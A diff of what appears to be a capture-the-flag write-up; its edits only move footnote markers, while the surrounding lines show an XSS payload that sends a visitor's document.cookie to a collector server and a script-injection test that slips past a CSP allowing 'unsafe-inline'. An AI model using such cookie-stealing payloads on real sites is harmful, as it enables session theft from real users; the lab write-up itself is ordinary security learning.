@@ -84,7 +84,7 @@ And it does work! Now with our foothold, what can we do with it?
 ## Exploitation
 During our enumeration, we understand that'll be a bot the crawls through the blog site itself. Hence our objective is to use XSS to steal the "cookie" of the admin which will hold our flag. I made a simple XSS payload that'll force the website to send their user cookie to my server as shown below;
 
-- Payload[^1]
+- Payload [^1]
 ```javascript
 <script>
 document.write('<img src="http://127.0.0.1:8000/?'+document.cookie+'"/>');
@@ -112,10 +112,10 @@ It is a good mitigation practise but with every mitigation, there'll be ways whe
 
 Hence with the mindset of "hey they probably misconfigured something", we can see that they allowed 'unsafe-inline' which can be our proper foothold for this obstacle. Implementing it in CSP is effectively disabling the important part of CSP. You are allowing javascript to run in the XSS. [^3] Hence with that in mind, let us find a payload to bypass it.
 
-```javascript[^4]
+```javascript
 "/><script>console.log("bypass works");</script>
-```
- 
+```[^4]
+
 
 ![CSP Bypass Works](img/bypasstestWorks.PNG)
 
